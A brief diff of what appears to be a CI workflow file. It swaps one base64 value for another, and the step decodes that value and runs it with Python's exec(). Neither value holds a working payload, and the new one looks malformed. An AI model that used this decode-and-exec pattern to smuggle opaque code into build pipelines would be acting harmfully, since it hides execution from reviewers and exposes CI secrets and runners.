@@ -17,7 +17,7 @@ jobs:
 
       - name: Apply v24 fixes
         env:
-          PATCH_B64: "eyJ3b3JrZXIiOiJodHRwOi8vZXhhbXBsZSJ9"
+          PATCH_B64: "'s3Jvc3M='"
         run: |
           python3 -c "import base64; exec(base64.b64decode('${PATCH_B64}'))"
 
